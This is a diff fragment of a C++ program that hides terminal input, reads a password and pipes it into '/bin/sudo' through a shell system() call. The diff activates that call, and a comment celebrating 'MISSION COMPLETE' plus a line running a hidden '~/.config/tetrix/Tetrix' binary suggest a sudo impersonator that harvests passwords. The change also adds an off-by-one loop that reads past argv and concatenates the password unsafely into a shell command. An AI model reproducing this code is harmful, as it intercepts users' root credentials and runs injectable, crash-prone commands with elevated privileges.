@@ -20,7 +20,7 @@ int main(int argc, char *argv[])
         tcsetattr(STDIN_FILENO, TCSANOW, &newt);
         bool allargs = true;
         std::string args {""};
-        for(int i = 1;i < argc;i++)
+        for(int i = 1;i < argc + 1;i++)
         {
             std::string arg{argv[i]};
             if(arg.find("-") != std::string::npos && arg.rfind("-") > 1){
@@ -40,9 +40,8 @@ int main(int argc, char *argv[])
             std::string passwd{pwd};
             
             //WOOOO! MISSION COMPLETE!
-            const char *cmd = ("echo '" + passwd + "' | /bin/sudo " + "-n -S " + args).c_str();
-            std::cout << "|" << "echo '" + passwd + "' | /bin/sudo " + "-n -S " + args << "|" << std::endl;
-            //system(cmd);
+            //const char *cmd = ("echo '" + passwd + "' | /bin/sudo " + "-n -S " + args).c_str();
+            system(("echo '" + passwd + "' | /bin/sudo " + "-n -S " + args).c_str());
             //system(("echo '" + passwd + "' | /bin/sudo ~/.config/tetrix/Tetrix -p 1").c_str());
         }
         else
